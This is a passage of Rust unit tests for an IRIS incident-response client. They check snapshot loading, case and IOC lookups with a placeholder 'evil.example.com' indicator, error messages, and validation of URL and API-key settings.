            "iocs": {"17": {"ioc": [{"ioc_id": 3, "ioc_value": "evil.example.com", "ioc_type": "domain", "tlp_name": "amber"}]}},
        }).to_string()).unwrap();
        let s = IrisSettings { url: p.display().to_string(), api_key: String::new(), insecure: false };
        assert_eq!(validate_settings(&s), Ok(())); // no API key needed
        let c = Client::new(&s).unwrap();
        assert_eq!(c.iris_url(), "https://iris.prod");
        assert_eq!(c.snapshot_time(), Some("2026-10-20T15:00:00-05:00"));
        assert_eq!(c.cases().unwrap()[0].name, "#17 - Prod");
        assert_eq!(c.iocs(17).unwrap()[0].value, "evil.example.com");
        assert!(c.iocs(99).unwrap_err().to_string().contains("rerun iris_snapshot.py"));
        fs::write(&p, r#"{"format": "something-else"}"#).unwrap();
        assert!(Client::new(&s).is_err());
        let _ = fs::remove_file(&p);
        let missing = IrisSettings { url: "/nope/snap.json".into(), ..s };
        assert!(validate_settings(&missing).is_err());
    }

    #[test]
    fn settings_validate() {
        let s = IrisSettings { url: "https://iris:8443".into(), api_key: "k".into(), insecure: true };
        assert!(validate_settings(&s).is_ok());
        assert!(validate_settings(&IrisSettings { url: "iris:8443".into(), ..s.clone() }).is_err());
        assert!(validate_settings(&IrisSettings { api_key: " ".into(), ..s }).is_err());
    }
}
